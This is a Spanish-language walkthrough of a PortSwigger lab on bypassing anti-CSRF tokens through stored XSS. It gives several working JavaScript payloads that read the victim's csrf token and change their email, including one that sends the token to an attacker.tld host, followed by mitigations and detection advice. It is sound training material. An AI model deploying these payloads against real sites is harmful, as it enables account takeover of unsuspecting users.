
---

# Evasión de CSRF usando XSS (cambio de email con token)

Este documento explica cómo aprovechar una vulnerabilidad de XSS para evadir defensas anti-CSRF: el payload XSS obtiene el token `csrf` de la página de cuenta del usuario y realiza una solicitud POST para cambiar su correo electrónico.

[Ver laboratorio PortSwigger](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)

---

## Contexto del laboratorio

- Tipo de vulnerabilidad: XSS (normalmente almacenado en comentarios del blog).
- Comportamiento de la víctima: un usuario simulado visualiza los comentarios publicados.
- Objetivo: cambiar el email de la víctima enviando `POST /my-account/change-email` con parámetros `email` y `csrf` válidos.
- Observación: la página `/my-account` contiene un input oculto con el token anti-CSRF: `name="csrf" value="..."`.

---

## Idea del ataque

1. Inyectar un script XSS en un comentario.
2. El script carga `/my-account`, extrae el valor del token `csrf` del HTML.
3. Con ese token, envía un `POST` a `/my-account/change-email` para actualizar el correo.

Este enfoque funciona porque el XSS ejecuta JavaScript en el contexto del origen legítimo; por tanto, puede realizar peticiones autenticadas y leer respuestas del mismo origen.

---

## Payload que resuelve el laboratorio (robusto, con `fetch` + DOMParser)

```html
<script>
(async () => {
    try {
        // 1) Obtener la página de cuenta y parsear el HTML en un DOM aislado
        const res = await fetch('/my-account', { credentials: 'include' });
        const html = await res.text();
        const doc = new DOMParser().parseFromString(html, 'text/html');
        const csrf = doc.querySelector('input[name="csrf"]').value;

        // 2) Enviar el cambio de email con application/x-www-form-urlencoded
        const body = 'csrf=' + encodeURIComponent(csrf) + '&email=' + encodeURIComponent('test@test.com');
        await fetch('/my-account/change-email', {
            method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body, credentials: 'include'
        });
    } catch (e) {
        console.log('XSS CSRF bypass error:', e);
    }
})();
</script>
```

- Cambia `test@test.com` por el correo deseado.
- `DOMParser` evita regex frágiles para extraer el token.
- `credentials: 'include'` asegura el envío de cookies de sesión.

---

## Paso a paso (resumen)

1. Publica el payload anterior como comentario en el post vulnerable.
2. Espera a que la víctima visite el post (el laboratorio lo hace automáticamente).
3. El script inyectado obtiene el token `csrf` y envía el `POST` de cambio de email.
4. Verifica en la interfaz de cuenta que el email ha cambiado (o que el laboratorio se marca como resuelto).

---

## Por qué funciona

- El XSS se ejecuta en el contexto del dominio objetivo, lo que habilita el **Same-Origin**: puede leer `/my-account` y enviar `POST` autenticados.
- Los tokens CSRF están diseñados para bloquear peticiones cross-site, pero **no protegen contra XSS**: si el atacante puede ejecutar JS en el origen, puede robar/usar el token.

---

## Variantes del payload

### A) Variante con XMLHttpRequest

```html
<script>
try {
    var req = new XMLHttpRequest();
    req.open('GET', '/my-account', true);
    req.onload = function () {
        var m = req.responseText.match(/name=["']csrf["']\s+value=["']([^"']+)/);
        if (!m) return;
        var csrf = m[1];

        var body = 'email=' + encodeURIComponent('hacked@mail.com') + '&csrf=' + encodeURIComponent(csrf);
        var req2 = new XMLHttpRequest();
        req2.open('POST', '/my-account/change-email', true);
        req2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        req2.send(body);
    };
    req.send();
} catch (e) { console.log(e); }
</script>
```

### B) Exfiltrar primero el token (burp collaborator / webhook)

```html
<script>
(async () => {
    const res = await fetch('/my-account');
    const html = await res.text();
    const m = html.match(/name=["']csrf["']\s+value=["']([^"']+)/);
    if (!m) return;
    new Image().src = 'https://attacker.tld/csrf?token=' + encodeURIComponent(m[1]);
})();
</script>
```

Con el token recibido en tu servidor, puedes completar manualmente la petición `POST` o automatizarla desde tu infraestructura.

### C) Variante sin manejo de errores

```js
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

---

## Notas y pequeños gotchas

- Asegúrate de usar `Content-Type: application/x-www-form-urlencoded` y codificar parámetros con `encodeURIComponent`.
- El nombre del parámetro suele ser `csrf`, pero podría variar. Ajusta el selector/regex si el lab usa otro nombre.
- Algunos labs pueden requerir que el email tenga un formato válido; usa un valor como `pwned@example.com`.

---

## Mitigaciones (cómo debería corregirse)

1. Eliminar el XSS: escapar/sanitizar salida, deshabilitar manejadores inline y aplicar CSP que bloquee `unsafe-inline`.
2. Recordar que los **tokens CSRF NO mitigan XSS**: la defensa contra XSS es independiente de CSRF.
3. Endurecer sesiones: `HttpOnly`, `Secure`, `SameSite=Lax/Strict` reducen superficie de CSRF tradicional, pero XSS seguirá pudiendo actuar en mismo origen.
4. Validar origen y referer para acciones sensibles (defensa adicional, no definitiva).
5. Rotación/expiración de tokens y atarlos a contexto (usuario, sesión, ruta) para reducir reusos.

---

## Detección y respuesta (blue team)

- Monitorizar picos de `POST /my-account/change-email` y correlacionar con visualizaciones de posts/comentarios.
- Revisar logs de aplicación en busca de patrones de carga de `/my-account` seguidos de cambio inmediato de email.
- Telemetría de navegador (CSP report-uri / report-to) para detectar ejecución de scripts inesperados.

---

## Ética y uso responsable

Este contenido es educativo. No pruebes ni explotes estas técnicas sin autorización explícita. Reporta hallazgos de forma responsable.

---
